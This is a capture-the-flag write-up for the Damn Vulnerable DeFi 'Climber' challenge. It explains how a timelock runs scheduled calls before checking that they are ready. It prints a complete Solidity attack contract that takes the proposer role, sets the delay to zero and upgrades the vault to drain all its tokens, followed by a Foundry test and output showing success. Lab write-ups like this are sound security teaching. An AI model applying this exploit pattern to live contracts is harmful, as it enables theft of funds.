# Challenge - Climber

There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.

The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.

On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.

On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.

## Objective of CTF

You must rescue all tokens from the vault and deposit them into the designated recovery account.

## Vulnerability Analysis

In the timelock contract, the `execute` function allows for the execution of scheduled actions. As mentioned in the challenge, only accounts with the "Proposer" role can schedule actions, but anyone can execute the scheduled actions, as shown below:

```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    if (targets.length <= MIN_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

However, there is a critical vulnerability here. The contract executes the actions before verifying if they are ready for execution.

This means that before the contract checks whether the actions are ready, you can execute arbitrary functions on any contract, including granting yourself the "Proposer" role. Using this vulnerability, you can schedule arbitrary function calls and take control of the contract.

To exploit this vulnerability, we can schedule the following actions:

-   Transfer ownership of the vault: We will transfer ownership of the vault to our malicious contract, giving us full control over its operations.
-   Grant proposer role: We will grant the "Proposer" role to our malicious contract, allowing us to schedule actions without restriction.
-   Update the timelock delay: We will set the timelock delay to zero, enabling immediate execution of any scheduled actions.
-   Schedule the above actions: Finally, we will schedule these actions, ensuring that they are ready to be executed instantly.

### Attack steps:

1. Schedule the malicious actions to be owner of the vault.
2. Call `upgradeToAndCall` to upgrade the malicious implementation and call the `sweepFunds` function the rescue token in the vault.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Ownable} from "solady/auth/Ownable.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ClimberVault} from "./ClimberVault.sol";

interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable;
    function updateDelay(uint64 newDelay) external;
    function grantRole(bytes32 role, address account) external;
}

interface IClimberVault {
    function transferOwnership(address newOwner) external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MaliciousClimberVault is ClimberVault {
    function sweepFunds(address token, address recovery) external {
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }
}

contract AttackClimber is Ownable {
    address private immutable vault;
    address private immutable timelock;
    address private immutable token;
    address private immutable recovery;

    address[] private targets = new address[](4);
    uint256[] private values = [0, 0, 0, 0];
    bytes[] private dataElements = new bytes[](4);

    constructor(address _vault, address _timelock, address _token, address _recovery) {
        _initializeOwner(msg.sender);

        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function attack() external onlyOwner {
        targets[0] = vault;
        values[0] = 0;
        // set this contract  as the owner of the vault
        dataElements[0] = abi.encodeCall(IClimberVault.transferOwnership, (address(this)));
        targets[1] = timelock;
        values[1] = 0;
        // grant the PROPOSER role to this contract for executing the schedule function later
        dataElements[1] = abi.encodeCall(IClimberTimelock.grantRole, (PROPOSER_ROLE, address(this)));
        targets[2] = timelock;
        values[2] = 0;
        // update the delay time for executing the schedule function later
        dataElements[2] = abi.encodeCall(IClimberTimelock.updateDelay, (0));
        targets[3] = address(this);
        values[3] = 0;
        // schedule these operations
        dataElements[3] = abi.encodeCall(AttackClimber.scheduleMalicious, ());

        IClimberTimelock(timelock).execute(targets, values, dataElements, hex"00");
        IClimberVault(vault).upgradeToAndCall(
            address(new MaliciousClimberVault()), abi.encodeCall(MaliciousClimberVault.sweepFunds, (token, recovery))
        );
    }

    function scheduleMalicious() external {
        IClimberTimelock(timelock).schedule(targets, values, dataElements, hex"00");
    }
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {AttackClimber} from "../../src/climber/AttackClimber.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the vault contract", token.balanceOf(address(vault)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );

        AttackClimber maliciousContract =
            new AttackClimber(address(vault), address(timelock), address(token), address(recovery));
        maliciousContract.attack();

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the vault contract", token.balanceOf(address(vault)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/climber/Climber.t.sol:ClimberChallenge
[PASS] test_assertInitialState() (gas: 63711)
[PASS] test_climber() (gas: 4616387)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the vault contract: 10000000.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the vault contract: 0.000000000000000000
  token balance in the recovery address: 10000000.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 10.95ms (3.02ms CPU time)

Ran 1 test suite in 247.17ms (10.95ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
